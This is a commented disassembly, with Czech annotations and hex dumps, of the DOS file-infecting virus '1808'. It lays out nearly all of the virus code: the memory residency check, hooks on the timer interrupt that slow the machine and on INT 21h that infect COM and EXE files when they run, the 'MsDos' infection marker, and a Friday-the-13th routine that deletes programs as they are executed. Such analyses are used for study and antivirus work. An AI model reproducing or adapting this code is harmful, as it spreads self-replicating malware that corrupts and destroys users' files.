;=======================================================================
;  VIRUS 1808
;  Virus se napojuje na preruseni 08 (hodiny) a zpomaluje chod pocitace.
;
;
;
45AD:0100 E99200         JMP    0195
0100  E9 92 00 73 55 4D 73 44-6F 73 00 01 77 14 00 00  i..sUMsDos..w...
0110  00 00 01 2C 02 70 00 1C-02 BC 0F EB 04 FE 0D C6  ...,.p...<.k.~.F
0120  5D 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ]...............
0130  00 F2 13 80 00 00 00 80-00 F2 13 5C 00 F2 13 6C  .r.......r.\.r.l
0140  00 F2 13 10 07 82 2A C5-00 82 2A 00 F0 06 00 4D  .r....*E..*.p..M
0150  5A 40 00 5D 01 00 00 20-00 2F 02 FF FF F3 2A 10  Z@.]... ./...s*.
0160  07 84 19 C5 00 F3 2A 1E-00 00 00 00 00 00 00 00  ...E.s*.........
0170  05 00 20 00 94 09 B0 B1-00 02 10 00 30 B1 02 00  .. ...01....01..

45AD:0195 FC             CLD
45AD:0196 B4E0           MOV    AH,E0    ;================================
45AD:0198 CD21           INT    21       ; Test pritomnosti v pamati.
45AD:019A 80FCE0         CMP    AH,E0    ;
45AD:019D 7316           JNB    01B5
45AD:019F 80FC03         CMP    AH,03
45AD:01A2 7211           JB     01B5
45AD:01A4 B4DD           MOV    AH,DD
45AD:01A6 BF0001         MOV    DI,0100
45AD:01A9 BE1007         MOV    SI,0710
45AD:01AC 03F7           ADD    SI,DI
45AD:01AE 2E8B8D1100     MOV    CX,CS:[DI+0011]
45AD:01B3 CD21           INT    21
45AD:01B5 8CC8           MOV    AX,CS
45AD:01B7 051000         ADD    AX,0010
45AD:01BA 8ED0           MOV    SS,AX
45AD:01BC BC0007         MOV    SP,0700
45AD:01BF 50             PUSH   AX
45AD:01C0 B8C500         MOV    AX,00C5
45AD:01C3 50             PUSH   AX
45AD:01C4 CB             RETF                ; Jdeme na nasledujici radek.
;=========================================================================
45BD:00C5 FC             CLD                 ;
45BD:00C6 06             PUSH   ES
45BD:00C7 2E8C063100     MOV    CS:[0031],ES
45BD:00CC 2E8C063900     MOV    CS:[0039],ES
45BD:00D1 2E8C063D00     MOV    CS:[003D],ES
45BD:00D6 2E8C064100     MOV    CS:[0041],ES
45BD:00DB 8CC0           MOV    AX,ES
45BD:00DD 051000         ADD    AX,0010
45BD:00E0 2E01064900     ADD    CS:[0049],AX
45BD:00E5 2E01064500     ADD    CS:[0045],AX
45BD:00EA B4E0           MOV    AH,E0           ;=========================
45BD:00EC CD21           INT    21              ;
45BD:00EE 80FCE0         CMP    AH,E0           ;
45BD:00F1 7313           JNB    0106            ;=========================
45BD:00F3 80FC03         CMP    AH,03           ; VIRUS JE INSTALOVAN.
45BD:00F6 07             POP    ES
45BD:00F7 2E8E164500     MOV    SS,CS:[0045]
45BD:00FC 2E8B264300     MOV    SP,CS:[0043]
45BD:0101 2EFF2E4700     JMP    FAR CS:[0047]
45BD:0106 33C0           XOR    AX,AX           ;=========================
45BD:0108 8EC0           MOV    ES,AX           ; VIRUS NENI INSTALOVAN.
45BD:010A 26A1FC03       MOV    AX,ES:[03FC]    ; Prerusovaci vektor 255.
45BD:010E 2EA34B00       MOV    CS:[004B],AX    ; Je definovan kod
45BD:0112 26A0FE03       MOV    AL,ES:[03FE]    ;       0000:03FC F3             REPZ
45BD:0116 2EA24D00       MOV    CS:[004D],AL            0000:03FD A5             MOVSW
45BD:011A 26C706FC03F3A5 MOV    Word Ptr ES:[03FC],A5F3 0000:03FE CB             RETF
45BD:0121 26C606FE03CB   MOV    Byte Ptr ES:[03FE],CB
45BD:0127 58             POP    AX
45BD:0128 051000         ADD    AX,0010
45BD:012B 8EC0           MOV    ES,AX
45BD:012D 0E             PUSH   CS
45BD:012E 1F             POP    DS
45BD:012F B91007         MOV    CX,0710
45BD:0132 D1E9           SHR    CX,1
45BD:0134 33F6           XOR    SI,SI
45BD:0136 8BFE           MOV    DI,SI
45BD:0138 06             PUSH   ES
45BD:0139 B84201         MOV    AX,0142
45BD:013C 50             PUSH   AX
45BD:013D EAFC030000     JMP    0000:03FC      ;========================
45BD:0142 8CC8           MOV    AX,CS          ; Po skoku pokracujeme
45BD:0144 8ED0           MOV    SS,AX          ; na 45BD:142
45BD:0146 BC0007         MOV    SP,0700
45BD:0149 33C0           XOR    AX,AX          ;========================
45BD:014B 8ED8           MOV    DS,AX          ;
45BD:014D 2EA14B00       MOV    AX,CS:[004B]   ; Obnoveni puvodni hodno-
45BD:0151 A3FC03         MOV    [03FC],AX      ; ty preruseni 255.
45BD:0154 2EA04D00       MOV    AL,CS:[004D]
45BD:0158 A2FE03         MOV    [03FE],AL
45BD:015B 8BDC           MOV    BX,SP          ; Velikost programu v
45BD:015D B104           MOV    CL,04          ; paragrafech.
45BD:015F D3EB           SHR    BX,CL
45BD:0161 83C310         ADD    BX,+10
45BD:0164 2E891E3300     MOV    CS:[0033],BX   ; Zmen velikost alokovane
45BD:0169 B44A           MOV    AH,4A          ; pameti.
45BD:016B 2E8E063100     MOV    ES,CS:[0031]   ;
45BD:0170 CD21           INT    21             ;========================
45BD:0172 B82135         MOV    AX,3521        ; Cti preruseni 21H.
45BD:0175 CD21           INT    21             ;
45BD:0177 2E891E1700     MOV    CS:[0017],BX   ;
45BD:017C 2E8C061900     MOV    CS:[0019],ES   ;========================
45BD:0181 0E             PUSH   CS
45BD:0182 1F             POP    DS
45BD:0183 BA5B02         MOV    DX,025B        ; Definice noveho vektoru
45BD:0186 B82125         MOV    AX,2521        ; preruseni 21H.
45BD:0189 CD21           INT    21             ;========================
45BD:018B 8E063100       MOV    ES,[0031]
45BD:018F 268E062C00     MOV    ES,ES:[002C]
45BD:0194 33FF           XOR    DI,DI
45BD:0196 B9FF7F         MOV    CX,7FFF
45BD:0199 32C0           XOR    AL,AL
45BD:019B F2             REPNZ
45BD:019C AE             SCASB
45BD:019D 263805         CMP    ES:[DI],AL
45BD:01A0 E0F9           LOOPNZ 019B
45BD:01A2 8BD7           MOV    DX,DI
45BD:01A4 83C203         ADD    DX,+03
45BD:01A7 B8004B         MOV    AX,4B00
45BD:01AA 06             PUSH   ES
45BD:01AB 1F             POP    DS
45BD:01AC 0E             PUSH   CS
45BD:01AD 07             POP    ES
45BD:01AE BB3500         MOV    BX,0035
45BD:01B1 1E             PUSH   DS
45BD:01B2 06             PUSH   ES
45BD:01B3 50             PUSH   AX
45BD:01B4 53             PUSH   BX
45BD:01B5 51             PUSH   CX
45BD:01B6 52             PUSH   DX
45BD:01B7 B42A           MOV    AH,2A            ; DATUM
45BD:01B9 CD21           INT    21               ;======================
45BD:01BB 2EC6060E0000   MOV    Byte Ptr CS:[000E],00
45BD:01C1 81F9C307       CMP    CX,07C3          ; Virus se nemnozi roku
45BD:01C5 7430           JZ     01F7             ; 1987, v patek 13 maze
45BD:01C7 3C05           CMP    AL,05            ; spustene soubory.
45BD:01C9 750D           JNZ    01D8
45BD:01CB 80FA0D         CMP    DL,0D
45BD:01CE 7508           JNZ    01D8
45BD:01D0 2EFE060E00     INC    Byte Ptr CS:[000E]
45BD:01D5 EB20           JMP    01F7
45BD:01D7 90             NOP
45BD:01D8 B80835         MOV    AX,3508         ;=======================
45BD:01DB CD21           INT    21              ; Redefinice preruseni
45BD:01DD 2E891E1300     MOV    CS:[0013],BX    ; 08.
45BD:01E2 2E8C061500     MOV    CS:[0015],ES
45BD:01E7 0E             PUSH   CS
45BD:01E8 1F             POP    DS
45BD:01E9 C7061F00907E   MOV    Word Ptr [001F],7E90
45BD:01EF B80825         MOV    AX,2508
45BD:01F2 BA1E02         MOV    DX,021E         ;
45BD:01F5 CD21           INT    21              ;=======================
45BD:01F7 5A             POP    DX
45BD:01F8 59             POP    CX
45BD:01F9 5B             POP    BX
45BD:01FA 58             POP    AX
45BD:01FB 07             POP    ES
45BD:01FC 1F             POP    DS
45BD:01FD 9C             PUSHF
45BD:01FE 2EFF1E1700     CALL   FAR CS:[0017]   ; LOAD AND EXECUTE.
45BD:0203 1E             PUSH   DS              ;
45BD:0204 07             POP    ES
45BD:0205 B449           MOV    AH,49
45BD:0207 CD21           INT    21
45BD:0209 B44D           MOV    AH,4D
45BD:020B CD21           INT    21
45BD:020D B431           MOV    AH,31
45BD:020F BA0006         MOV    DX,0600
45BD:0212 B104           MOV    CL,04
45BD:0214 D3EA           SHR    DX,CL
45BD:0216 83C210         ADD    DX,+10
45BD:0219 CD21           INT    21
45BD:021B 32C0           XOR    AL,AL
45BD:021D CF             IRET
;
;=======================================================================
; OBSLUHA PRERUSENI 08.
;
45BD:021E 2E833E1F0002   CMP    Word Ptr CS:[001F],+02
45BD:0224 7517           JNZ    023D
45BD:0226 50             PUSH   AX
45BD:0227 53             PUSH   BX
45BD:0228 51             PUSH   CX
45BD:0229 52             PUSH   DX
45BD:022A 55             PUSH   BP
45BD:022B B80206         MOV    AX,0602
45BD:022E B787           MOV    BH,87
45BD:0230 B90505         MOV    CX,0505
45BD:0233 BA1010         MOV    DX,1010
45BD:0236 CD10           INT    10
45BD:0238 5D             POP    BP
45BD:0239 5A             POP    DX
45BD:023A 59             POP    CX
45BD:023B 5B             POP    BX
45BD:023C 58             POP    AX
45BD:023D 2EFF0E1F00     DEC    Word Ptr CS:[001F]
45BD:0242 7512           JNZ    0256
45BD:0244 2EC7061F000100 MOV    Word Ptr CS:[001F],0001
45BD:024B 50             PUSH   AX
45BD:024C 51             PUSH   CX
45BD:024D 56             PUSH   SI
45BD:024E B90140         MOV    CX,4001
45BD:0251 F3             REPZ
45BD:0252 AC             LODSB
45BD:0253 5E             POP    SI
45BD:0254 59             POP    CX
45BD:0255 58             POP    AX
45BD:0256 2EFF2E1300     JMP    FAR CS:[0013]
;
;=======================================================================
; OBSLUHA PRERUSENI 21H.
;
45BD:025B 9C             PUSHF
45BD:025C 80FCE0         CMP    AH,E0
45BD:025F 7505           JNZ    0266
45BD:0261 B80003         MOV    AX,0300      ; Test pritomnosti.
45BD:0264 9D             POPF                ;
45BD:0265 CF             IRET                ;==========================
45BD:0266 80FCDD         CMP    AH,DD          ;
45BD:0269 7413           JZ     027E
45BD:026B 80FCDE         CMP    AH,DE
45BD:026E 7428           JZ     0298
45BD:0270 3D004B         CMP    AX,4B00        ; LOAD AND EXECUTE.
45BD:0273 7503           JNZ    0278
45BD:0275 E9B400         JMP    032C
45BD:0278 9D             POPF
45BD:0279 2EFF2E1700     JMP    FAR CS:[0017]  ; Puvodni obsluha.
                         ;==============================================
45BD:027E 58             POP    AX             ; Obsluha kodu 0DDH.
45BD:027F 58             POP    AX
45BD:0280 B80001         MOV    AX,0100
45BD:0283 2EA30A00       MOV    CS:[000A],AX
45BD:0287 58             POP    AX
45BD:0288 2EA30C00       MOV    CS:[000C],AX
45BD:028C F3             REPZ
45BD:028D A4             MOVSB
45BD:028E 9D             POPF
45BD:028F 2EA10F00       MOV    AX,CS:[000F]
45BD:0293 2EFF2E0A00     JMP    FAR CS:[000A]
                         ;==============================================
45BD:0298 83C406         ADD    SP,+06         ; Obsluha kodu 0DEH.
45BD:029B 9D             POPF
45BD:029C 8CC8           MOV    AX,CS
45BD:029E 8ED0           MOV    SS,AX
45BD:02A0 BC1007         MOV    SP,0710
45BD:02A3 06             PUSH   ES
45BD:02A4 06             PUSH   ES
45BD:02A5 33FF           XOR    DI,DI
45BD:02A7 0E             PUSH   CS
45BD:02A8 07             POP    ES
45BD:02A9 B91000         MOV    CX,0010
45BD:02AC 8BF3           MOV    SI,BX
45BD:02AE BF2100         MOV    DI,0021
45BD:02B1 F3             REPZ
45BD:02B2 A4             MOVSB
45BD:02B3 8CD8           MOV    AX,DS
45BD:02B5 8EC0           MOV    ES,AX
45BD:02B7 2EF7267A00     MUL    Word Ptr CS:[007A]
45BD:02BC 2E03062B00     ADD    AX,CS:[002B]
45BD:02C1 83D200         ADC    DX,+00
45BD:02C4 2EF7367A00     DIV    Word Ptr CS:[007A]
45BD:02C9 8ED8           MOV    DS,AX
45BD:02CB 8BF2           MOV    SI,DX
45BD:02CD 8BFA           MOV    DI,DX
45BD:02CF 8CC5           MOV    BP,ES
45BD:02D1 2E8B1E2F00     MOV    BX,CS:[002F]
45BD:02D6 0BDB           OR     BX,BX
45BD:02D8 7413           JZ     02ED
45BD:02DA B90080         MOV    CX,8000
45BD:02DD F3             REPZ
45BD:02DE A5             MOVSW
45BD:02DF 050010         ADD    AX,1000
45BD:02E2 81C50010       ADD    BP,1000
45BD:02E6 8ED8           MOV    DS,AX
45BD:02E8 8EC5           MOV    ES,BP
45BD:02EA 4B             DEC    BX
45BD:02EB 75ED           JNZ    02DA
45BD:02ED 2E8B0E2D00     MOV    CX,CS:[002D]
45BD:02F2 F3             REPZ
45BD:02F3 A4             MOVSB
45BD:02F4 58             POP    AX
45BD:02F5 50             PUSH   AX
45BD:02F6 051000         ADD    AX,0010
45BD:02F9 2E01062900     ADD    CS:[0029],AX
45BD:02FE 2E01062500     ADD    CS:[0025],AX
45BD:0303 2EA12100       MOV    AX,CS:[0021]
45BD:0307 1F             POP    DS
45BD:0308 07             POP    ES
45BD:0309 2E8E162900     MOV    SS,CS:[0029]
45BD:030E 2E8B262700     MOV    SP,CS:[0027]
45BD:0313 2EFF2E2300     JMP    FAR CS:[0023]
                         ;==============================================
45BD:0318 33C9           XOR    CX,CX          ; Vymazani souboru.
45BD:031A B80143         MOV    AX,4301        ; Zmen atributy souboru.
45BD:031D CD21           INT    21             ;
45BD:031F B441           MOV    AH,41          ; Vymaz
45BD:0321 CD21           INT    21
45BD:0323 B8004B         MOV    AX,4B00        ; a vykonej.
45BD:0326 9D             POPF
45BD:0327 2EFF2E1700     JMP    FAR CS:[0017]  ; FUNGUJE v patek 13.
                         ;==============================================
45BD:032C 2E803E0E0001   CMP    Byte Ptr CS:[000E],01  ; LOAD & EXECUTE.
45BD:0332 74E4           JZ     0318
45BD:0334 2EC7067000FFFF MOV    Word Ptr CS:[0070],FFFF
45BD:033B 2EC7068F000000 MOV    Word Ptr CS:[008F],0000
45BD:0342 2E89168000     MOV    CS:[0080],DX
45BD:0347 2E8C1E8200     MOV    CS:[0082],DS
45BD:034C 50             PUSH   AX
45BD:034D 53             PUSH   BX
45BD:034E 51             PUSH   CX
45BD:034F 52             PUSH   DX
45BD:0350 56             PUSH   SI
45BD:0351 57             PUSH   DI
45BD:0352 1E             PUSH   DS
45BD:0353 06             PUSH   ES
45BD:0354 FC             CLD
45BD:0355 8BFA           MOV    DI,DX
45BD:0357 32D2           XOR    DL,DL
45BD:0359 807D013A       CMP    Byte Ptr [DI+01],3A
45BD:035D 7505           JNZ    0364        ;
45BD:035F 8A15           MOV    DL,[DI]     ; Volny prostor na disku.
45BD:0361 80E21F         AND    DL,1F
45BD:0364 B436           MOV    AH,36
45BD:0366 CD21           INT    21
45BD:0368 3DFFFF         CMP    AX,FFFF
45BD:036B 7503           JNZ    0370
45BD:036D E97702         JMP    05E7        ;==========================
45BD:0370 F7E3           MUL    BX          ; Vypocet volneho prostoru.
45BD:0372 F7E1           MUL    CX
45BD:0374 0BD2           OR     DX,DX
45BD:0376 7505           JNZ    037D
45BD:0378 3D1007         CMP    AX,0710     ; Je dost mista na VIRUS?
45BD:037B 72F0           JB     036D
45BD:037D 2E8B168000     MOV    DX,CS:[0080]
45BD:0382 1E             PUSH   DS
45BD:0383 07             POP    ES
45BD:0384 32C0           XOR    AL,AL
45BD:0386 B94100         MOV    CX,0041
45BD:0389 F2             REPNZ              ; Hledani konce retezce.
45BD:038A AE             SCASB
45BD:038B 2E8B368000     MOV    SI,CS:[0080]
45BD:0390 8A04           MOV    AL,[SI]
45BD:0392 0AC0           OR     AL,AL
45BD:0394 740E           JZ     03A4
45BD:0396 3C61           CMP    AL,61
45BD:0398 7207           JB     03A1
45BD:039A 3C7A           CMP    AL,7A
45BD:039C 7703           JA     03A1
45BD:039E 802C20         SUB    Byte Ptr [SI],20
45BD:03A1 46             INC    SI
45BD:03A2 EBEC           JMP    0390
45BD:03A4 B90B00         MOV    CX,000B
45BD:03A7 2BF1           SUB    SI,CX
45BD:03A9 BF8400         MOV    DI,0084
45BD:03AC 0E             PUSH   CS
45BD:03AD 07             POP    ES
45BD:03AE B90B00         MOV    CX,000B
45BD:03B1 F3             REPZ                 ; VIRUS neinfikuje
45BD:03B2 A6             CMPSB                ; COMMAND.COM
45E3:03B3 7503           JNZ    03B8
45E3:03B5 E92F02         JMP    05E7
45E3:03B8 B80043         MOV    AX,4300       ; Zjisti atributy
45E3:03BB CD21           INT    21            ; souboru.
45E3:03BD 7205           JB     03C4
45E3:03BF 2E890E7200     MOV    CS:[0072],CX
45E3:03C4 7225           JB     03EB
45E3:03C6 32C0           XOR    AL,AL
45E3:03C8 2EA24E00       MOV    CS:[004E],AL
45E3:03CC 1E             PUSH   DS
45E3:03CD 07             POP    ES
45E3:03CE 8BFA           MOV    DI,DX
45E3:03D0 B94100         MOV    CX,0041
45E3:03D3 F2             REPNZ
45E3:03D4 AE             SCASB
45E3:03D5 807DFE4D       CMP    Byte Ptr [DI-02],4D ; Rozeznani COM
45E3:03D9 740B           JZ     03E6                ; a EXE souboru.
45E3:03DB 807DFE6D       CMP    Byte Ptr [DI-02],6D
45E3:03DF 7405           JZ     03E6
45E3:03E1 2EFE064E00     INC    Byte Ptr CS:[004E]
45E3:03E6 B8003D         MOV    AX,3D00             ; Otevri soubor.
45E3:03E9 CD21           INT    21
45E3:03EB 725A           JB     0447
45E3:03ED 2EA37000       MOV    CS:[0070],AX
45E3:03F1 8BD8           MOV    BX,AX
45E3:03F3 B80242         MOV    AX,4202       ; Posun R/W pointer.
45E3:03F6 B9FFFF         MOV    CX,FFFF       ; 5 byte od konce
45E3:03F9 BAFBFF         MOV    DX,FFFB       ; souboru.
45E3:03FC CD21           INT    21            ;=====================
45E3:03FE 72EB           JB     03EB
45E3:0400 050500         ADD    AX,0005
45E3:0403 2EA31100       MOV    CS:[0011],AX
45E3:0407 B90500         MOV    CX,0005
45E3:040A BA6B00         MOV    DX,006B       ; Cti ze souboru
45E3:040D 8CC8           MOV    AX,CS         ; 5 byte (CS:6B)
45E3:040F 8ED8           MOV    DS,AX
45E3:0411 8EC0           MOV    ES,AX
45E3:0413 B43F           MOV    AH,3F
45E3:0415 CD21           INT    21
45E3:0417 8BFA           MOV    DI,DX
45E3:0419 BE0500         MOV    SI,0005       ; Rozpoznavaci kod je
45E3:041C F3             REPZ                 ; MsDos.
45E3:041D A6             CMPSB
45E3:041E 7507           JNZ    0427
45E3:0420 B43E           MOV    AH,3E         ; Soubor je nakazen.
45E3:0422 CD21           INT    21
45E3:0424 E9C001         JMP    05E7
45E3:0427 B82435         MOV    AX,3524
45E3:042A CD21           INT    21
45E3:042C 891E1B00       MOV    [001B],BX
45E3:0430 8C061D00       MOV    [001D],ES
45E3:0434 BA1B02         MOV    DX,021B
45E3:0437 B82425         MOV    AX,2524
45E3:043A CD21           INT    21
45E3:043C C5168000       LDS    DX,[0080]
45E3:0440 33C9           XOR    CX,CX
45E3:0442 B80143         MOV    AX,4301
45E3:0445 CD21           INT    21
45E3:0447 723B           JB     0484
45E3:0449 2E8B1E7000     MOV    BX,CS:[0070]
45E3:044E B43E           MOV    AH,3E
45E3:0450 CD21           INT    21
45E3:0452 2EC7067000FFFF MOV    Word Ptr CS:[0070],FFFF
45E3:0459 B8023D         MOV    AX,3D02
45E3:045C CD21           INT    21
45E3:045E 7224           JB     0484
45E3:0460 2EA37000       MOV    CS:[0070],AX
45E3:0464 8CC8           MOV    AX,CS
45E3:0466 8ED8           MOV    DS,AX
45E3:0468 8EC0           MOV    ES,AX
45E3:046A 8B1E7000       MOV    BX,[0070]
45E3:046E B80057         MOV    AX,5700
45E3:0471 CD21           INT    21
45E3:0473 89167400       MOV    [0074],DX
45E3:0477 890E7600       MOV    [0076],CX
45E3:047B B80042         MOV    AX,4200
45E3:047E 33C9           XOR    CX,CX
45E3:0480 8BD1           MOV    DX,CX
45E3:0482 CD21           INT    21
45E3:0484 723D           JB     04C3
45E3:0486 803E4E0000     CMP    Byte Ptr [004E],00
45E3:048B 7403           JZ     0490
45E3:048D EB57           JMP    04E6
45E3:048F 90             NOP
45E3:0490 BB0010         MOV    BX,1000
45E3:0493 B448           MOV    AH,48
45E3:0495 CD21           INT    21
45E3:0497 730B           JNB    04A4
45E3:0499 B43E           MOV    AH,3E
45E3:049B 8B1E7000       MOV    BX,[0070]
45E3:049F CD21           INT    21
45E3:04A1 E94301         JMP    05E7
45E3:04A4 FF068F00       INC    Word Ptr [008F]
45E3:04A8 8EC0           MOV    ES,AX
45E3:04AA 33F6           XOR    SI,SI
45E3:04AC 8BFE           MOV    DI,SI
45E3:04AE B91007         MOV    CX,0710
45E3:04B1 F3             REPZ
45E3:04B2 A4             MOVSB
45E3:04B3 8BD7           MOV    DX,DI
45E3:04B5 8B0E1100       MOV    CX,[0011]
45E3:04B9 8B1E7000       MOV    BX,[0070]
45E3:04BD 06             PUSH   ES
45E3:04BE 1F             POP    DS
45E3:04BF B43F           MOV    AH,3F
45E3:04C1 CD21           INT    21
45E3:04C3 721C           JB     04E1
45E3:04C5 03F9           ADD    DI,CX
45E3:04C7 33C9           XOR    CX,CX
45E3:04C9 8BD1           MOV    DX,CX
45E3:04CB B80042         MOV    AX,4200
45E3:04CE CD21           INT    21
45E3:04D0 BE0500         MOV    SI,0005
45E3:04D3 B90500         MOV    CX,0005
45E3:04D6 F3             REPZ
45E3:04D7 2EA4           MOVSB  CS:
45E3:04D9 8BCF           MOV    CX,DI
45E3:04DB 33D2           XOR    DX,DX
45E3:04DD B440           MOV    AH,40
45E3:04DF CD21           INT    21
45E3:04E1 720D           JB     04F0
45E3:04E3 E9BC00         JMP    05A2
45E3:04E6 B91C00         MOV    CX,001C
45E3:04E9 BA4F00         MOV    DX,004F
45E3:04EC B43F           MOV    AH,3F
45E3:04EE CD21           INT    21
45E3:04F0 724A           JB     053C
45E3:04F2 C70661008419   MOV    Word Ptr [0061],1984
45E3:04F8 A15D00         MOV    AX,[005D]
45E3:04FB A34500         MOV    [0045],AX
45E3:04FE A15F00         MOV    AX,[005F]
45E3:0501 A34300         MOV    [0043],AX
45E3:0504 A16300         MOV    AX,[0063]
45E3:0507 A34700         MOV    [0047],AX
45E3:050A A16500         MOV    AX,[0065]
45E3:050D A34900         MOV    [0049],AX
45E3:0510 A15300         MOV    AX,[0053]
45E3:0513 833E510000     CMP    Word Ptr [0051],+00
45E3:0518 7401           JZ     051B
45E3:051A 48             DEC    AX
45E3:051B F7267800       MUL    Word Ptr [0078]
45E3:051F 03065100       ADD    AX,[0051]
45E3:0523 83D200         ADC    DX,+00
45E3:0526 050F00         ADD    AX,000F
45E3:0529 83D200         ADC    DX,+00
45E3:052C 25F0FF         AND    AX,FFF0
45E3:052F A37C00         MOV    [007C],AX
45E3:0532 89167E00       MOV    [007E],DX
45E3:0536 051007         ADD    AX,0710
45E3:0539 83D200         ADC    DX,+00
45E3:053C 723A           JB     0578
45E3:053E F7367800       DIV    Word Ptr [0078]
45E3:0542 0BD2           OR     DX,DX
45E3:0544 7401           JZ     0547
45E3:0546 40             INC    AX
45E3:0547 A35300         MOV    [0053],AX
45E3:054A 89165100       MOV    [0051],DX
45E3:054E A17C00         MOV    AX,[007C]
45E3:0551 8B167E00       MOV    DX,[007E]
45E3:0555 F7367A00       DIV    Word Ptr [007A]
45E3:0559 2B065700       SUB    AX,[0057]
45E3:055D A36500         MOV    [0065],AX
45E3:0560 C7066300C500   MOV    Word Ptr [0063],00C5
45E3:0566 A35D00         MOV    [005D],AX
45E3:0569 C7065F001007   MOV    Word Ptr [005F],0710
45E3:056F 33C9           XOR    CX,CX
45E3:0571 8BD1           MOV    DX,CX
45E3:0573 B80042         MOV    AX,4200
45E3:0576 CD21           INT    21
45E3:0578 720A           JB     0584
45E3:057A B91C00         MOV    CX,001C
45E3:057D BA4F00         MOV    DX,004F
45E3:0580 B440           MOV    AH,40
45E3:0582 CD21           INT    21
45E3:0584 7211           JB     0597
45E3:0586 3BC1           CMP    AX,CX
45E3:0588 7518           JNZ    05A2
45E3:058A 8B167C00       MOV    DX,[007C]
45E3:058E 8B0E7E00       MOV    CX,[007E]
45E3:0592 B80042         MOV    AX,4200
45E3:0595 CD21           INT    21
45E3:0597 7209           JB     05A2
45E3:0599 33D2           XOR    DX,DX
45E3:059B B91007         MOV    CX,0710
45E3:059E B440           MOV    AH,40
45E3:05A0 CD21           INT    21
45E3:05A2 2E833E8F0000   CMP    Word Ptr CS:[008F],+00
45E3:05A8 7404           JZ     05AE
45E3:05AA B449           MOV    AH,49
45E3:05AC CD21           INT    21
45E3:05AE 2E833E7000FF   CMP    Word Ptr CS:[0070],-01
45E3:05B4 7431           JZ     05E7
45E3:05B6 2E8B1E7000     MOV    BX,CS:[0070]
45E3:05BB 2E8B167400     MOV    DX,CS:[0074]
45E3:05C0 2E8B0E7600     MOV    CX,CS:[0076]
45E3:05C5 B80157         MOV    AX,5701
45E3:05C8 CD21           INT    21
45E3:05CA B43E           MOV    AH,3E
45E3:05CC CD21           INT    21
45E3:05CE 2EC5168000     LDS    DX,CS:[0080]
45E3:05D3 2E8B0E7200     MOV    CX,CS:[0072]
45E3:05D8 B80143         MOV    AX,4301
45E3:05DB CD21           INT    21
45E3:05DD 2EC5161B00     LDS    DX,CS:[001B]
45E3:05E2 B82425         MOV    AX,2524
45E3:05E5 CD21           INT    21
45E3:05E7 07             POP    ES
45E3:05E8 1F             POP    DS
45E3:05E9 5F             POP    DI
45E3:05EA 5E             POP    SI
45E3:05EB 5A             POP    DX
45E3:05EC 59             POP    CX
45E3:05ED 5B             POP    BX
45E3:05EE 58             POP    AX
45E3:05EF 9D             POPF
45E3:05F0 2EFF2E1700     JMP    FAR CS:[0017]
45E3:05F0                 00 00 00-00 00 00 00 00 00 00 00       ...........
45E3:0600  F2 13 50 43 54 4F 4F 4C-53 2E 45 58 45 00 22 2F  r.PCTOOLS.EXE."/
45E3:0610  01 FE 0D 00 8B 00 F0 F0-83 F2 F4 03 00 0F 00 00  .~....pp.rt.....
45E3:0620  4D FE 0D 04 00 45 43 3D-43 3A 5C 43 4F 4D 4D 41  M~...EC=C:\COMMA
45E3:0630  00 47 02 00 00 32 00 FF-FF FF FF FF FF FF FF FF  .G...2..........
45E3:0640  FF FF FF FF FF FF FF FF-FF 43 3A 5C 5A 53 53 52  .........C:\ZSSR
45E3:0650  5C 4B 41 4C 49 42 52 5C-4B 41 49 4B 49 2E 42 41  \KALIBR\KAIKI.BA
45E3:0660  54 00 6B 61 69 6B 69 0D-00 FF FF FF 00 00 00 00  T.kaiki.........
45E3:0670  4D FE 0D 00 10                                   M~...
45E3:0670                 00 00 00-00 00 00 00 00 00 00 00       ...........
45E3:0680  E9 92 00 73 55 4D 73 44-6F 73 00 01 77           i..sUMsDos